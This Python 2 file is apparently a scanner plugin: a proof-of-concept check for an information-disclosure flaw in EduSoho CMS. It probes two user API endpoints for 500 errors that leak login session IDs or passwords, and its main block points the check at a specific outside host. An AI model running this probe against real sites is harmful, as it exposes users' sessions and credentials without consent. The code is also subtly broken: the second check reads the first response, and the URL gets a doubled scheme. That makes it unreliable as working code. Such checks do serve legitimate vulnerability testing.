from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#coding:utf-8


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        poc1 = arg+'api/users/1/followings'
        poc2 = arg+'api/users/1/friendship?toIds[]=a'
        code, head, res1, errcode, _ = curl.curl2(poc1)
        code, head, res2, errcode, _ = curl.curl2(poc2)
        if code == 500 and "loginSessionId" in res1:
            output("edusoho vulnerable:"+poc1,result,'hole')
        if code == 500 and "'password' => '" in res1:
            output("edusoho vulnerable:"+poc2,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  edusohocms  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='edusohocms Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/edusohocms/edusohocms_3d644fd5efb2fc076e04a786e1190083.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/edusohocms/edusohocms_3d644fd5efb2fc076e04a786e1190083.py
#/root/github/poccreate/codesrc/exp-2193.py